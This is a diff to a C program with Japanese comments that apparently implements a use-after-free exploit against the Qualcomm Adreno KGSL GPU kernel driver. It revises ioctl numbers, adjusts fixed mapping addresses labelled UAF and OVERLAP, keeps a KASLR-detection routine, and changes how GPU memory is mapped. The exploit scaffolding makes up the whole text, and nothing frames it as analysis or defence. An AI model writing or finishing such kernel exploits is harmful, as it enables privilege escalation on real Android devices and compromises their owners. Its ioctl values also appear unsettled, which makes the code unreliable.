@@ -23,12 +23,12 @@
 
 #define KGSL_IOC_TYPE 0x09
 
-/* ===== 正しい ioctl 番号 (kgsl_ioctl_funcs インデックス) ===== */
-#define IOCTL_KGSL_GPUMEM_ALLOC     _IOWR(KGSL_IOC_TYPE, 0x0E, struct kgsl_gpumem_alloc)
-#define IOCTL_KGSL_SHAREDMEM_FREE   _IOW(KGSL_IOC_TYPE, 0x0A, struct kgsl_sharedmem_free)
-#define IOCTL_KGSL_MAP_USER_MEM     _IOWR(KGSL_IOC_TYPE, 0x08, struct kgsl_map_user_mem)
-#define IOCTL_KGSL_SUBMIT_COMMANDS  _IOWR(KGSL_IOC_TYPE, 0x03, struct kgsl_gpu_command)
-#define IOCTL_KGSL_DRAWCTXT_CREATE  _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
+/* ===== 正しい ioctl 番号 ===== */
+#define IOCTL_KGSL_GPUMEM_ALLOC      _IOWR(KGSL_IOC_TYPE, 0x0C, struct kgsl_gpumem_alloc)
+#define IOCTL_KGSL_SHAREDMEM_FREE    _IOW(KGSL_IOC_TYPE, 0x0A, struct kgsl_sharedmem_free)
+#define IOCTL_KGSL_MAP_USER_MEM      _IOWR(KGSL_IOC_TYPE, 0x08, struct kgsl_map_user_mem)
+#define IOCTL_KGSL_SUBMIT_COMMANDS   _IOWR(KGSL_IOC_TYPE, 0x03, struct kgsl_gpu_command)
+#define IOCTL_KGSL_DRAWCTXT_CREATE   _IOWR(KGSL_IOC_TYPE, 0x06, struct kgsl_drawctxt_create)
 #define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x04, struct kgsl_cmdstream_readtimestamp_ctxtid)
 
 /* ===== 構造体定義 (カーネルソース準拠) ===== */
@@ -101,7 +101,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid {
 
 /* ===== SVM 範囲 (Adreno 308: 0x300000～0xC0000000-16MB) ===== */
 #define UAF_ADDR       0x7001ff000ULL
-#define UAF_SIZE       0x10004000ULL
+#define UAF_SIZE       0x10004000ULL          // 16MB+16KB
 #define OVERLAP_ADDR   0x7001fe000ULL
 #define OVERLAP_SIZE   0x7000ULL
 #define BOGUS_ADDR     0x700204000ULL
@@ -208,7 +208,7 @@ static uint64_t detect_kaslr(void) {
     return ic_addr;
 }
 
-// ===== ラッパー関数 (旧インターフェース) =====
+// ===== ラッパー関数 =====
 
 static void gpumem_alloc(int fd, uint64_t size, uint64_t flags, uint64_t *gpuaddr) {
     struct kgsl_gpumem_alloc a = { .size = size, .flags = flags };
@@ -275,8 +275,8 @@ static int wait_timestamp(int fd, unsigned int ctx_id, unsigned int target) {
     return -2;
 }
 
-static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
-    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, (off_t)id << 12);
+static void *gpuobj_mmap(int fd, size_t size, off_t offset) {
+    void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
     if (p == MAP_FAILED) die("gpuobj_mmap");
     return p;
 }
@@ -325,14 +325,9 @@ int main(int argc, char **argv) {
     printf("  Using alloc_flags=0x%lx\n", (unsigned long)alloc_flags);
 
     uint64_t uaf_gpuaddr, ph_gpuaddr, ov_gpuaddr;
-    unsigned int uaf_id = 0, ph_id = 0, ov_id = 0; // id は使用しない (GPUMEM_ALLOC は id を返さない)
 
     gpumem_alloc(kgsl_fd, UAF_SIZE, alloc_flags, &uaf_gpuaddr);
-    // mmap の offset は id ではなく、gpuaddr のページ番号？実際は gpuaddr は無関係で、mmap は fd と offset で識別する。
-    // このドライバーでは、mmap の offset が id として使われるかどうか確認する必要がある。
-    // 古いインターフェースでは mmap の offset は id ではなく gpuaddr のページ番号かもしれない。
-    // ここでは offset = (uaf_gpuaddr >> PAGE_SHIFT) とする（一般的な手法）。
-    off_t uaf_offset = uaf_gpuaddr >> 12; // PAGE_SHIFT = 12
+    off_t uaf_offset = uaf_gpuaddr >> 12;
     void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, uaf_offset);
     if (uaf_m == MAP_FAILED) die("mmap UAF");
